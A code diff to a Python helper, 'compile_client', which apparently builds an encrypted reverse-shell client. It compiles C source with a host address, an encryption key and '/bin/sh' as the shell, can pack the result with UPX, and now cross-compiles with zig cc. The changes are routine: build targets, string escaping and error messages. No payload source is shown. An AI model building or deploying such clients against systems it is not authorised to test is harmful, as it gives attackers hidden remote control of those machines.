@@ -15,7 +15,10 @@ logger = logging.getLogger(__name__)
 def _c_string_escape(s: str) -> str:
     return '"{}"'.format(
         "".join(
-            c if c.isascii() and c not in ('"', "\\") else f"\\x{ord(c):02x}" for c in s
+            c
+            if c.isascii() and c not in ('"', "\\")
+            else "".join(f"\\x{b:02x}" for b in c.encode())
+            for c in s
         )
     )
 
@@ -23,7 +26,7 @@ def _c_string_escape(s: str) -> str:
 async def compile_client(
     encryption_key: str,
     host: tuple[str, int],
-    compiler: str = "gcc",
+    target_arch: str = "x86_64",
     shell_command: str = "/bin/sh",
     buffer_length: int = 1024,
     upx: bool = False,
@@ -47,16 +50,18 @@ async def compile_client(
         client_binary = Path(temp_dir) / "client"
 
         result = await create_subprocess_exec(
-            compiler,
-            *["-o", client_binary, *compiler_extra_args],
+            *["zig", "cc", f"--target={target_arch}-linux-musl"],
             *[f"-D{key}={value}" for key, value in defines.items()],
+            *["-o", client_binary, *compiler_extra_args],
             CLIENT_SOURCE,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
         )
         _, stderr = await result.communicate()
         if result.returncode:
-            logger.error("Failed to compile client: %s", stderr.decode())
+            logger.error(
+                "Compiler exited with code %d: %s", result.returncode, stderr.decode()
+            )
             raise RuntimeError("Failed to compile client")
 
         file_size = client_binary.stat().st_size
@@ -73,7 +78,9 @@ async def compile_client(
             _, stderr = await result.communicate()
 
             if result.returncode:
-                logger.error("Failed to compress client: %s", stderr.decode())
+                logger.error(
+                    "UPX exited with code %d: %s", result.returncode, stderr.decode()
+                )
                 raise RuntimeError("Failed to compress client")
 
             compressed_size = client_binary.stat().st_size
